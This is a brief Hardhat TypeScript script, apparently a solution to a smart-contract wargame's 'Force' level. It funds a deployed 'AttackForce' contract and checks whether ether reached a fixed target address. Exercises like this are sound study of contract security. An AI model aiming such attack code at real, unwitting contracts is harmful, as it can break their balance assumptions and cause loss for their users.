import { deployments, ethers } from "hardhat";
import { Address, Deployment } from "hardhat-deploy/types";

const delay = (ms: number) => {
    return new Promise((resolve) => setTimeout(resolve, ms));
};

const main = async () => {

    const [deployer] = await ethers.getSigners();
    const forceAddress: Address = "0xDcBB276857C3fBF64b7A26179dA02B34133d5203";
    const attackForceDeployment: Deployment = await deployments.get("AttackForce");

    console.log(`Previous Balance: ${await ethers.provider.getBalance(forceAddress)}`);
    console.log(`Working...`);
    await deployer.sendTransaction({
        to: attackForceDeployment.address,
        value: ethers.utils.parseEther("0.0001")
    });
    await delay(10000);
    console.log(`Balance: ${await ethers.provider.getBalance(forceAddress)}`);
    
}

main();
